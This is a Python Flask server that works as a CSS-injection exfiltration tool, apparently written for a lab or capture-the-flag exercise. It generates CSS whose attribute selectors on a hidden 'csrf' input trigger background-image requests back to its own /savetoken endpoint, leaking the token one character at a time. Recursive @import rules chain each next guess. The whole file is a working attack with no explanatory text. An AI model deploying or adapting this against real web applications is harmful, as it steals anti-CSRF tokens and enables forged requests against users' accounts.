import time

from flask import Flask, request, render_template
from flask import Response

app = Flask(__name__, static_url_path="", static_folder="static", template_folder="")

chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
token = ""

# sem = threading.Semaphore()

@app.route("/")
def index():
    return render_template("index.html")


@app.route("/gettoken")
def gettoken():
    global token

    return token


@app.route("/savetoken")
def savetoken():
    global token
    global chars

    token_received = request.args.get("token")
    print(token_received)
    if token_received is not None:
        if len(token_received) > len(token):
            token = token_received

    return ""


@app.route("/gethack.css")
def get_hack_css():
    response = ''

    for char in chars:
        response += 'input[name=csrf][value^="%s"]{ background-image: url("http://localhost:9000/savetoken?token=%s"); } \n' % (
            token + char, token + char)

    return Response(response, mimetype='text/css')


@app.route("/get.css")
def get_css():
    global token
    global chars

    char_index = int(request.args.get("i"))
    response = ''

    while len(token) < (char_index - 1):
        time.sleep(.1)
    response += '@import url("http://localhost:9000/gethack.css?i=' + str(char_index) + '");\n'
    response += '@import url("http://localhost:9000/get.css?i=' + str(char_index + 1) + '");\n'

    return Response(response, mimetype='text/css')


if __name__ == "__main__":
    app.run(host='::1', port=9000)
